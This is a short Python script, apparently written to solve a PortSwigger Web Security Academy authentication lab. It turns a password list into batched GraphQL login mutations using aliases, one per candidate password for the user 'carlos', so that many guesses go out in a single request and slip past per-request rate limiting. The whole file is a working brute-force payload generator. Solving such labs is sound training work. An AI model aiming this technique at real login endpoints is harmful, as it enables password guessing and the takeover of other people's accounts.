import sys

#to solve the lab
#https://portswigger.net/web-security/authentication/auth-lab-passwords

#add those inside
#mutation login{}
def generate_bruteforce_file(input_file, output_file):
    try:
        # Read passwords from input file using ISO-8859-1 encoding
        with open(input_file, 'r', encoding='ISO-8859-1') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        # Generate mutation entries
        entries = []
        for index, password in enumerate(passwords):
            mutation = f"""
            bruteforce{index}:login(input:{{password: \"{password}\", username: \"carlos\"}}) {{
                token
                success
            }}
            """.strip()
            entries.append(mutation)
        
        # Write entries to output file with proper formatting
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n\n'.join(entries))
            
        print(f"Generated {len(passwords)} entries in {output_file}")
        
    except FileNotFoundError:
        print(f"Error: File '{input_file}' not found")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <input_password_file> <output_file>")
        sys.exit(1)
    
    input_path = sys.argv[1]
    output_path = sys.argv[2]
    generate_bruteforce_file(input_path, output_path)
